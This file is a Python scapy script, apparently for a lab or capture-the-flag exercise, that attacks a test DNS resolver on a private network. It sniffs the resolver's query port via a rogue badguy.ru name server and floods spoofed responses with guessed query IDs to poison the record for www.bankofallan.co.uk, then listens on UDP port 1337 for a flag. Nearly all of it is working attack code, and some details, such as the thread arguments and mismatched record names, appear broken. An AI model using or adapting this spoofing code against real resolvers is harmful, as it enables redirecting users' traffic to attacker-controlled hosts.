#! /usr/bin/env python3
# -*- coding: utf-8 -*-
"""Venom DNS server attacker

This script makes

"""

import threading
import time
from socket import *

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send, sniff

TARGET_IP = "192.168.56.101"  # vulnDNS's IP
TARGET_PORT_REQUEST = 53  # target port for first vulnDNS's IP request

BAD_DNS_SERVER_IP = "192.168.56.1"  # DNS endpoint IP of badguy.ru (also present on config.json)
BAD_DNS_SERVER_PORT = 53  # DNS endpoint port of badguy.ru (also present on config.json)

SPOOFED_DNS = "192.168.56.100"
URL_TO_POISON = "www.bankofallan.co.uk"

DNS_URL_BADGUY = "www.badguy.ru"

PACKET_SIZE = 500  # number of packets

# print headers just for debug and info
DNS_ROUTINE_HEADER = "DNS_SERVER_ROUTINE: "
BITE_THE_RAT_HEADER = "BITE_THE_RAT: "
LISTENER_HEADER = "LISTENER_FLAG: "


def dns_server_routine():
    print(DNS_ROUTINE_HEADER + "Starting DNS server of badguy.ru routine")
    while True:
        a = sniff(filter="port " + str(BAD_DNS_SERVER_PORT), count=1, promisc=1)
        if not a[0].haslayer(DNS) or a[0].qr:
            continue

        print(DNS_ROUTINE_HEADER + "I've catched a packet")
        sniffed_packet = a[0]
        sniffed_ip = sniffed_packet.getlayer(IP)
        sniffed_dns = sniffed_packet.getlayer(DNS)
        first_dns_res = IP(dst=sniffed_ip.src, src=sniffed_ip.dst) / UDP(dport=sniffed_ip.sport,
                                                                         sport=sniffed_ip.dport) / DNS(
            id=sniffed_dns.id, qd=sniffed_dns.qd, an=DNSRR(
                rrname=sniffed_dns.qd.qname,
                ttl=10,
                rdata=sniffed_ip.dst))

        # Answer about badguy for vulnDNS
        send(first_dns_res)

        target_port = sniffed_ip.sport
        print(DNS_ROUTINE_HEADER +
              "\nSniffed ip src " + str(sniffed_ip.src) + ", src port: " + str(sniffed_ip.sport) + "\nDst ip :" +
              str(sniffed_ip.dst) + ", dest port:" + str(sniffed_ip.dport) + "\nTarget port response is " +
              str(target_port) + "\n")

        bite_rat_thread = threading.Thread(name="bite_rat_thread", target=bite_the_rat, args=target_port)
        # uncomment to attack
        # bite_rat_thread.start()


# get current time in milliseconds
def current_milli_time():
    """
    Calculate time milliseconds and return an int value

    """
    return int(round(time.time() * 1000))


def bite_the_rat(target_port_sniffed):
    """
    Attack function.


    """
    for i in range(PACKET_SIZE):
        random_url = URL_TO_POISON
        dns_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1,  # recursion desired
                                                                           qd=DNSQR(qname=random_url))

        # since we've to guess the query id we define a time-based pseudo random generator
        query_id = current_milli_time() % 65536  # 16 bit maximum delimiter of query_id's DNS field
        packet = IP(src=SPOOFED_DNS, dst=TARGET_IP) / UDP(dport=target_port_sniffed) / DNS(id=query_id,
                                                                                           an=None,
                                                                                           qd=DNSQR(
                                                                                               qname=DNS_URL_BADGUY,
                                                                                               qtype="A"),
                                                                                           ar=(DNSRR(
                                                                                               rrname='ns.bankofallan.com',
                                                                                               type="A", ttl=60000,
                                                                                               rdata='192.168.56.1')))
        print(BITE_THE_RAT_HEADER + "request sent")
        print(BITE_THE_RAT_HEADER + "Bite the RaT")
        send(dns_req, verbose=0)
        send(packet, verbose=0)


UDP_IP = "192.168.56.1"
UDP_PORT = 1337
BUFFER_SIZE = 1024


def flag_victory_listener():
    """
    This script listens on port 1337 the Victory flag.

    """
    sock = socket(AF_INET,  # Internet
                  SOCK_DGRAM)  # UDP
    print(LISTENER_HEADER + "Starting server...")
    sock.bind((UDP_IP, UDP_PORT))
    print(LISTENER_HEADER + "done!")
    try:
        while True:
            data, addr = sock.recvfrom(BUFFER_SIZE)
            print(LISTENER_HEADER + "Received from \"" + addr[0] + "\": " + str(data))
    except KeyboardInterrupt:
        print(LISTENER_HEADER + "Closing socket to exit gracefully...")
        sock.close()
        print(LISTENER_HEADER + "Socket close, bye bye!")
        exit(0)


def main():
    print("Initializing attack...")
    dns_badguy_thread = threading.Thread(name="dns_badguy_thread", target=dns_server_routine)
    flag_victory_thread = threading.Thread(name="flag_victory_thread", target=flag_victory_listener)
    print("Threads created!")
    print("Starting listener to get victory flag")
    flag_victory_thread.start()
    print("Starting DNS of badguy to get port and initial query id")
    dns_badguy_thread.start()

    # point 1: send a dns request for badguy.ru
    print(
        "Sending first request to " + TARGET_IP + "asking for badguy.ru to get an initial queryid and port with our "
                                                  "DNS")
    first_dns_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1,  # recursion desired
                                                                             qd=DNSQR(qname=DNS_URL_BADGUY))

    send(first_dns_req, verbose=0)


#    flag_victory_thread.join()
#    dns_badguy_thread.join()


if __name__ == "__main__":
    main()
